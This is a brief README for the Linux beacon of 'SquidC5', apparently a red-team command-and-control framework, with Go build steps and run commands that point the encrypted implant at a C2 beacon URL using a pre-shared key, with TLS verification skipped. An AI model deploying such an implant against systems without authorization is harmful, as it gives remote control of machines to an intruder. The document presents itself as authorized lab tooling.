# SquidC5 native Linux beacon v1

Authorized lab use only.

## Build

```bash
cd agents/linux
go mod init squidc5/sc5beacon 2>/dev/null || true
go get golang.org/x/crypto/chacha20poly1305
go build -o sc5beacon .
```

## Run

```bash
export SC5_URL="https://C2:8443/api/v1/implant/beacon"
export SC5_PSK="$(cat /path/to/data/implant_psk.txt)"
./sc5beacon
```

Uses the same ChaCha20-Poly1305 envelope as the Python implant crypto module.
TLS verify is skipped for lab self-signed certs.
